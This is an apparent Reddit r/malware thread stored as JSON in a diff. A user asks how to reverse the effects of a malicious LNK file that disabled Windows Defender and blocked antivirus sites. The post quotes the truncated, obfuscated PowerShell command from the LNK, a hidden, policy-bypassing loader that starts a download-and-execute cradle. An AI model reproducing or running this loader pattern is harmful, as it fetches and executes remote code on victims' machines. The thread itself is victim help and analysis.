@@ -1,0 +1,44 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "Accidently clicked on a LNK file starting:\n\nNow access to antivirus websites and [microsoft.com](https://microsoft.com) is disabled. Also Windows 10 Virus &amp; Threat protection was set to disabled and updates are failing. Also antivirus software updates are failing. \n\nHow to reverse this?\n\n&amp;#x200B;\n\nC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoPr -WINd 1 -eXEc ByP  ( '49Y45Y58U20P28!4eY65!77U2dU4fU62P6aU65&lt;63U74&lt;20U53O79O73Y74O65Y6dP2e!4eY65!74&lt;2eO57U65P62&lt;43&lt;6cY69:65h6e&lt;74&lt;29!2eh44:6fh77:6e:6c!6f:61!64!53P74O72O69&lt;6eh67&lt;28P27h68:74!74h70",
+        "title": "Reversing a Powershell malware",
+        "score": 1,
+        "id": "a1wevp",
+        "commsNum": 2,
+        "timeStamp": "2018/11/30-13:00:00",
+        "author_name": "OnMission",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 2,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/a1wevp/reversing_a_powershell_malware/"
+    },
+    "posts": {
+        "eatauxi": {
+            "comment": "Also looks like decryption routines are missing for the obfuscated string. If OP could give the full LNK, it would be better that useless command :)",
+            "timeStamp": "2018/11/30-13:20:23",
+            "id": "eatauxi",
+            "is_submitter": false,
+            "link_id": "t3_a1wevp",
+            "parent_id": "t1_eata3ul",
+            "score": 1,
+            "stickied": false,
+            "author_name": "aaSSfxxx"
+        },
+        "eata3ul": {
+            "comment": "[deleted]",
+            "timeStamp": "2018/11/30-13:10:46",
+            "id": "eata3ul",
+            "is_submitter": false,
+            "link_id": "t3_a1wevp",
+            "parent_id": "t3_a1wevp",
+            "score": 3,
+            "stickied": false,
+            "author_name": "[deleted]"
+        }
+    }
+}
